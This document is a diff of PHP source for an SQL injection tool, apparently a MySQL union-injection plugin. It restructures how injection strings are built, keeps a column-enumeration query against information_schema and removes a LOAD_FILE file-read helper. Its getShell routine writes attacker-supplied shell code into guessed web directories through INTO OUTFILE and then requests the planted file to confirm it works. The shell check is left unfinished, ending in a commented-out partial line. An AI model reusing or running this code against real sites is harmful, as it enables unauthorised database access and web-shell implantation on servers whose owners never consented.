@@ -255,8 +255,12 @@
 
 			}
 
+			/**
+			*This method creates the injection string it uses $this->_injection parameters in order
+			*to make the injection string. 
+			*/
 
-			public function unionQuery($value,$from=NULL,Array $where=array(),Array $group=array()){
+			private function buildUnionInjection($value,$from=NULL,Array $where=array(),Array $group=array()){
 
 				$params	=	$this->_injection;
 
@@ -270,8 +274,6 @@
 					}
 
 				}
-
-				//$params["fieldValues"]	=	$this->wrapArray($params["fieldValues"],$params["wrapping"]);
 
 				$this->_queryBuilder->union($params["fieldValues"],"ALL");
 
@@ -297,10 +299,22 @@
 					}
 				}
 
+
+			}
+
+			/**
+			*This method creates the injection string through the buildUnionInjection method and executes the query
+			*/
+
+			public function unionQuery($value,$from=NULL,Array $where=array(),Array $group=array()){
+				
+				$params	=	$this->_injection;
 				$sql		=	$this->_queryBuilder->getSQL();
 				$sql		=	$params["requestValue"].$params["payload"].$this->_queryBuilder->getSpaceCharacter().$sql.$params["comment"];
 
 				$this->_queryBuilder->setSQL($sql);
+
+				$this->buildUnionInjection($value,$from,$where,$group);
 
 				return parent::query($params["requestVariable"],__FUNCTION__);
 
@@ -575,7 +589,8 @@
 
 				$this->log("Fetching table \"$table\" columns ...",0,"white");
 
-				$select							=	"COLUMN_NAME,0x7c,COLUMN_TYPE,0x7c,IF(COLUMN_KEY,COLUMN_KEY,0),0x7c,IF(EXTRA,EXTRA,0)";
+				$select							=	"COLUMN_NAME,0x7c,COLUMN_TYPE,0x7c,IF(COLUMN_KEY,COLUMN_KEY,0)".
+														",0x7c,IF(EXTRA,EXTRA,0)";
 				$from								=	"information_schema.columns";
 
 				$where							=	array(
@@ -697,20 +712,19 @@
 
 			}
 
-			public function loadFile($file=NULL){
 
-				$select	=	"LOAD_FILE(".\String::hexEncode($file).')';	
-				$from		=	"";
-				return $this->generateInjection($select,$from);	
+			public function getShell(\aidSQL\core\PluginLoader &$pLoader,\aidSQL\http\crawler &$crawler){
 
-			}
+				$shellCode	=	&$this->_shellCode;
+				$restoreUrl	=	clone($this->_httpAdapter->getUrl());
 
+				if(empty($shellCode)){
 
-			public function getShell(\aidSQL\core\PluginLoader &$pLoader,\aidSQL\http\crawler $crawler,Array $options){
+					throw (new \Exception("Cant make shell without any shell code, use the shell-code option to set your shell code",1,"red"));
 
-				$restoreUrl				=	$this->_httpAdapter->getUrl();
-				$shellCode				=	$this->_shellCode;
+				}
 
+				$this->buildUnionInjection($shellCode);
 				$webDefaultsPlugin	=	$pLoader->getPluginInstance("info","defaults",$this->_httpAdapter,$this->_log);
 				$information			=	$webDefaultsPlugin->getInfo();
 
@@ -759,9 +773,9 @@
 					$webDir	=	trim($webDir,'/').'/';
 
 					foreach($unixDirectories as $unixDir){
-	
+
 						$this->_httpAdapter->setUrl($restoreUrl);
-			
+	
 						$unixDir					=	'/'.trim($unixDir,'/');
 						$shellWebLocation		=	$url.'/'.$webDir.$fileName;
 
@@ -773,33 +787,29 @@
 							$shellDirLocations[]	=	$unixDir.'/'.substr($host,strpos($host,'.')+1).'/'.$webDir.$fileName;
 						}
 
-
 						foreach($shellDirLocations as $shellDirLocation){
 
-							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"white");
+							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"light_cyan");
+
+							$this->buildUnionInjection($shellCode);	
 							$this->_queryBuilder->toOutFile($shellDirLocation);
 
-							$injection	=	$this->generateInjection($shellCode,$outFile);
+							$sql	=	$this->_injection["requestValue"]			.
+										$this->_injection["payload"]					.
+										$this->_queryBuilder->getSpaceCharacter()	.
+										$this->_queryBuilder->getSQL()				.
+										$this->_injection["comment"];
 
-							try{
+							$this->_queryBuilder->setSQL($sql);
 
-								$this->analyzeInjection($injection,FALSE);
+							parent::query($this->_injection["requestVariable"]);
 
-								$result			=	$this->analyzeInjection($this->loadFile($shellDirLocation));
-								$decodedShell	=	\String::asciiEncode($shellCode);
+							$testUrl	=	new \aidSQL\core\Url($shellWebLocation);
+							$this->_httpAdapter->setUrl($testUrl);
+							$contents	=	$this->_httpAdapter->fetch();
 
-								if($result!==FALSE&&sizeof($result)){
-
-									if($result[0]==$decodedShell){
-										return $shellWebLocation;
-									}
-
-								}
+							//if(\String::hexEncode($contents)==$this->
 							
-							}catch(\Exception $e){
-
-
-							}
 
 						}	
 
